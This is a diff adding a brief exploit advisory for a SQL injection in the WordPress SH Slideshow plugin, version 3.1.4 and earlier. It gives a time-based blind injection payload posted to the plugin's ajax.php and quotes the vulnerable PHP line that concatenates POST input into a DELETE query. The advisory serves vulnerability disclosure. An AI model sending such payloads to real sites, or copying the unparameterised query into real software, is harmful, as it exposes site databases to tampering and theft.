@@ -1,0 +1,16 @@
+# Exploit Title: WordPress SH Slideshow plugin <= 3.1.4 SQL Injection Vulnerability
+# Date: 2011-08-29
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/sh-slideshow.3.1.4.zip
+# Version: 3.1.4 (tested)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/sh-slideshow/ajax.php
+ id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+$result = $wpdb->query('delete from sh_slides where id = '.$_POST['id']);
